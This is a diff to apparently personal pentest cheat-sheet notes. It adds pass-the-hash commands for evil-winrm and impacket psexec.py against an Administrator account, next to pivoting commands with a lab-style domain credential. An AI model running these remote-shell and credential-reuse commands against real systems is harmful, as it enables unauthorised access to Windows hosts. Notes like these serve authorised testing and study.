@@ -66,6 +66,12 @@ With a pivot host and chisel + proxychains
 proxychains evil-winrm -i $ip -u $user -p $password
 ```
 
+With hashes:
+
+```bash
+evil-winrm -i $ip -u Administrator -H "32693b11e6aa90eb43d32c72a07ceea6"
+```
+
 
 ## psexec.py
 
@@ -75,4 +81,11 @@ With a pivot host and chisel + proxychains
 proxychains tools/impacket/examples/psexec.py INLANEFREIGHT.LOCAL/svc_sql:lucky7@172.16.6.50
 ```
 
-mstsc.exe 
+Passing a hash:
+
+```bash
+python3 psexec.py Administrator@$ip -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+```
+
+
+## mstsc.exe 
